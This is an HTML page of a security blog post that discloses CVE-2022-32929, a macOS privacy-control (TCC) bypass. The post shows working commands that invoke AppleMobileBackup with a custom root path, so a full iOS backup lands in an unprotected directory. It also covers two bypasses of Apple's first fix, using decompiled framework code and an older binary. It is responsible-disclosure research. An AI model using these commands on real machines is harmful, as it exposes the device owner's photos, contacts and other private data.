<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  CVE-2022-32929 - Bypass iOS backup&#39;s TCC protection · theevilbit blog
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Csaba Fitzl">
<meta name="description" content="
  Intro
  
    
    Link to heading
  

Normally, when a users backup their iOS device, the backup is saved into ~/Library/Application Support/MobileSync/Backup directory. The MobileSync directory is properly protected by TCC, as the backup can contain photos, contact information, everything from the iOS device, and it might be unencrypted, so this is a whole lot of private information. It&rsquo;s only accessible with Full Disk Access rights.
The issue is that an attacker can invoke the AppleMobileBackup utility and make a backup to a custom location. Thus completely bypassing the protected backup location.">
<meta name="keywords" content="blog,macos,apple,security,vulnerability,exploit,cve">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE-2022-32929 - Bypass iOS backup&#39;s TCC protection">
  <meta name="twitter:description" content="Intro Link to heading Normally, when a users backup their iOS device, the backup is saved into ~/Library/Application Support/MobileSync/Backup directory. The MobileSync directory is properly protected by TCC, as the backup can contain photos, contact information, everything from the iOS device, and it might be unencrypted, so this is a whole lot of private information. It’s only accessible with Full Disk Access rights.
The issue is that an attacker can invoke the AppleMobileBackup utility and make a backup to a custom location. Thus completely bypassing the protected backup location.">

<meta property="og:url" content="https://theevilbit.github.io/posts/cve-2022-32929/">
  <meta property="og:site_name" content="theevilbit blog">
  <meta property="og:title" content="CVE-2022-32929 - Bypass iOS backup&#39;s TCC protection">
  <meta property="og:description" content="Intro Link to heading Normally, when a users backup their iOS device, the backup is saved into ~/Library/Application Support/MobileSync/Backup directory. The MobileSync directory is properly protected by TCC, as the backup can contain photos, contact information, everything from the iOS device, and it might be unencrypted, so this is a whole lot of private information. It’s only accessible with Full Disk Access rights.
The issue is that an attacker can invoke the AppleMobileBackup utility and make a backup to a custom location. Thus completely bypassing the protected backup location.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-11-14T00:00:00+00:00">
    <meta property="article:modified_time" content="2022-11-14T00:00:00+00:00">
    <meta property="article:tag" content="Macos">
    <meta property="article:tag" content="Tcc">
    <meta property="article:tag" content="Vulnerability">
    <meta property="article:tag" content="Cve">




<link rel="canonical" href="https://theevilbit.github.io/posts/cve-2022-32929/">


<link rel="preload" href="https://theevilbit.github.io/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://theevilbit.github.io/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://theevilbit.github.io/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />






  
    
    
    <link rel="stylesheet" href="https://theevilbit.github.io/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
  



 




<link rel="icon" type="image/svg+xml" href="https://theevilbit.github.io/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="https://theevilbit.github.io/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://theevilbit.github.io/images/apple-touch-icon.png">

<link rel="manifest" href="https://theevilbit.github.io/site.webmanifest">
<link rel="mask-icon" href="https://theevilbit.github.io/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://theevilbit.github.io/">
      theevilbit blog
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/posts/">Posts</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/talks/">Talks and Workshops</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/shield/">Shield.app</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/beyond/">Beyond good ol&#39; LaunchAgents</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/tags/">Tags</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/about/">About</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://theevilbit.github.io/posts/cve-2022-32929/">
              CVE-2022-32929 - Bypass iOS backup&#39;s TCC protection
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2022-11-14T00:00:00Z">
                November 14, 2022
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              3-minute read
            </span>
          </div>
          
          <div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
    <a href="https://theevilbit.github.io/categories/blog/">BLOG</a></div>

          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/macos/">Macos</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/tcc/">Tcc</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/vulnerability/">Vulnerability</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/cve/">Cve</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <h2 id="intro">
  Intro
  <a class="heading-link" href="#intro">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Normally, when a users backup their iOS device, the backup is saved into <code>~/Library/Application Support/MobileSync/Backup</code> directory. The <code>MobileSync</code> directory is properly protected by TCC, as the backup can contain photos, contact information, everything from the iOS device, and it might be unencrypted, so this is a whole lot of private information. It&rsquo;s only accessible with Full Disk Access rights.</p>
<p>The issue is that an attacker can invoke the <code>AppleMobileBackup</code> utility and make a backup to a custom location. Thus completely bypassing the protected backup location.</p>
<p>First, we need to find out the UDID of the connected iOS device, we can do this with the following one-liner:</p>
<pre tabindex="0"><code>system_profiler SPUSBDataType | sed -n -E -e &#39;/(iPhone|iPad)/,/Serial/s/ *Serial Number: *(.+)/\1/p&#39;
</code></pre><p>With my test iPhone 12 Pro connected I got the following:</p>
<pre tabindex="0"><code>csaby@mac ~ % system_profiler SPUSBDataType | sed -n -E -e &#39;/(iPhone|iPad)/,/Serial/s/ *Serial Number: *(.+)/\1/p&#39;            
2021-11-23 17:37:01.606 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
2021-11-23 17:37:01.607 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
2021-11-23 17:37:01.607 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
2021-11-23 17:37:01.608 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
2021-11-23 17:37:01.608 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
2021-11-23 17:37:01.609 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
2021-11-23 17:37:01.610 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
AAAAAAAAXXXXXXXXXXXXXXXX
</code></pre><p>There are a few failures, but the last line is actually the UDID of the device, <code>AAAAAAAAXXXXXXXXXXXXXXXX</code> (note that this is obfuscated, this is not a real UDID).</p>
<p>Then we can make a backup:</p>
<pre tabindex="0"><code>/Library/Apple/System/Library/PrivateFrameworks/MobileDevice.framework/Versions/A/AppleMobileDeviceHelper.app/Contents/Resources/AppleMobileBackup -b --target &#34;AAAAAAAA-XXXXXXXXXXXXXXXX&#34; --root /tmp/
</code></pre><p>This will make a full backup, and we can access it, for example:</p>
<pre tabindex="0"><code>csaby@mac ~ % ls -l /tmp/AAAAAAAA-XXXXXXXXXXXXXXXX/00 
total 6792
-rw-r--r--  1 csaby  wheel    42057 Nov 23 17:41 00002e8b25129e2c7ca48f8e6fae558ae448b1d8
...
</code></pre><p>Apple initially fixed this by removing the <code>--root</code> option from <code>AppleMobileBackup</code>. I reported two bypasses, which they say it&rsquo;s fixed as well now, under the same CVE.</p>
<h3 id="bypass-1">
  Bypass 1
  <a class="heading-link" href="#bypass-1">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Although I haven&rsquo;t done it, someone could reimplement the bug using the <code>/Library/Apple/System/Library/PrivateFrameworks/DeviceLink.framework/Versions/A/DeviceLink</code> framework, as it still has the function, called <code>_DLSetRootDirectory</code> to set the root directory.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">_DLSetRootDirectory</span>(<span style="color:#078;font-weight:bold">int</span> arg0, <span style="color:#078;font-weight:bold">int</span> arg1) {
</span></span><span style="display:flex;"><span>    r14 <span style="color:#555">=</span> arg1;
</span></span><span style="display:flex;"><span>    rbx <span style="color:#555">=</span> arg0;
</span></span><span style="display:flex;"><span>    rdi <span style="color:#555">=</span> <span style="color:#555">*</span>(arg0 <span style="color:#555">+</span> <span style="color:#f60">0x98</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (rdi <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>            CFRelease(rdi);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#555">*</span>(rbx <span style="color:#555">+</span> <span style="color:#f60">0x98</span>) <span style="color:#555">=</span> r14;
</span></span><span style="display:flex;"><span>    CFRetain(r14);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (_DLShouldLog(<span style="color:#f60">0x6</span>) <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>            __DLLog(<span style="color:#c30">&#34;/AppleInternal/Library/BuildRoots/800759f9-1149-11ed-a6b7-ea36a6e2fcb9/Library/Caches/com.apple.xbs/Sources/DeviceLink/WireProtocol/DeviceLinkConnection.c&#34;</span>, <span style="color:#c30">&#34;DLSetRootDirectory&#34;</span>, <span style="color:#f60">0x6</span>, <span style="color:#c30">@&#34;DLSetRootDirectory(</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">%@</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">)&#34;</span>, r14, r9, stack[<span style="color:#f60">0</span>]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* @class MBComputerManager2 */</span>
</span></span><span style="display:flex;"><span>-(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#c0f">backupWithTargetIdentifier:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">options:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> {
</span></span><span style="display:flex;"><span>    var_30 <span style="color:#555">=</span> arg3;
</span></span><span style="display:flex;"><span>    r13 <span style="color:#555">=</span> arg2;
</span></span><span style="display:flex;"><span>    r12 <span style="color:#555">=</span> <span style="color:#366">self</span>;
</span></span><span style="display:flex;"><span>    rbx <span style="color:#555">=</span> <span style="color:#555">*</span>ivar_offset(_backupTargetIdentifier);
</span></span><span style="display:flex;"><span>    [<span style="color:#555">*</span>(<span style="color:#366">self</span> <span style="color:#555">+</span> rbx) <span style="color:#069;font-weight:bold">release</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#555">*</span>(r12 <span style="color:#555">+</span> rbx) <span style="color:#555">=</span> [r13 <span style="color:#069;font-weight:bold">retain</span>];
</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [NSMutableDictionary <span style="color:#99f">dictionaryWithCapacity</span>:<span style="color:#f60">0x0</span>];
</span></span><span style="display:flex;"><span>    r14 <span style="color:#555">=</span> rax;
</span></span><span style="display:flex;"><span>    [rax <span style="color:#99f">setObject</span>:<span style="color:#c30">@&#34;Backup&#34;</span> <span style="color:#99f">forKey</span>:<span style="color:#c30">@&#34;MessageName&#34;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (r13 <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>            [r14 <span style="color:#99f">setObject</span>:r13 <span style="color:#99f">forKey</span>:<span style="color:#c30">@&#34;TargetIdentifier&#34;</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    rbx <span style="color:#555">=</span> var_30;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (rbx <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>            [r14 <span style="color:#99f">setObject</span>:rbx <span style="color:#99f">forKey</span>:<span style="color:#c30">@&#34;Options&#34;</span>];
</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> [rbx <span style="color:#99f">objectForKey</span>:<span style="color:#c30">@&#34;RootDirectory&#34;</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>                    [r12 <span style="color:#99f">setRootDirectory</span>:rax];
</span></span><span style="display:flex;"><span>                    DLEnsureDirectoryExists(rax);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    var_38 <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
</span></span><span style="display:flex;"><span>    [r12 <span style="color:#99f">_sendMessage</span>:r14 <span style="color:#99f">error</span>:<span style="color:#555">&amp;</span>var_38];
</span></span><span style="display:flex;"><span>    rbx <span style="color:#555">=</span> <span style="color:#555">*</span>ivar_offset(_backupTargetIdentifier);
</span></span><span style="display:flex;"><span>    [<span style="color:#555">*</span>(r12 <span style="color:#555">+</span> rbx) <span style="color:#069;font-weight:bold">release</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#555">*</span>(r12 <span style="color:#555">+</span> rbx) <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> sub_100008c92(var_38);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> rax;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="bypass-2">
  Bypass 2
  <a class="heading-link" href="#bypass-2">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>The other option was to copy the binary from Monterey and simply run it on Ventura Beta 5. It still works as it has the <code>--root</code> option, and wasn&rsquo;t disallowed in AMFI.</p>
<pre tabindex="0"><code>csaby@csabys-Mac ~ % ./AppleMobileDeviceHelper.app/Contents/Resources/AppleMobileBackup -b --target &#34;AAAAAAAA-XXXXXXXXXXXXXXXX&#34; --root /tmp/
csaby@csabys-Mac ~ % sw_vers 
ProductName:		macOS
ProductVersion:		13.0
BuildVersion:		22A5321d
csaby@csabys-Mac ~ % shasum ./AppleMobileDeviceHelper.app/Contents/Resources/AppleMobileBackup
05554a5309bee93182dc7e876f51036fa107413b  ./AppleMobileDeviceHelper.app/Contents/Resources/AppleMobileBackup
csaby@csabys-Mac ~ % ls -l /private/tmp 
total 0
drwxr-xr-x  260 csaby  wheel  8320 Aug 11 14:42 AAAAAAAA-XXXXXXXXXXXXXXXX
</code></pre><h3 id="fix">
  Fix
  <a class="heading-link" href="#fix">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>I didn&rsquo;t verify how Apple fixed this at the end, but CVE-2022-32929 is only reported for iOS devices, and based on the following Twitter thread they might have decided to do something on the iOS end rather than on macOS. Apple asks the passcode now for every single backup. This is unfortunate, as this was an issue related to macOS, and it sounds like Apple have broken some functionality by making backups much harder on iOS.</p>
<p><a href="https://twitter.com/j_obermayr/status/1591347615618453504"  class="external-link" target="_blank" rel="noopener">https://twitter.com/j_obermayr/status/1591347615618453504</a></p>

      </div>


      <footer>
        


        
        
        
        
        
        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2019 -
    
    2025
     Csaba Fitzl 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="https://theevilbit.github.io/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
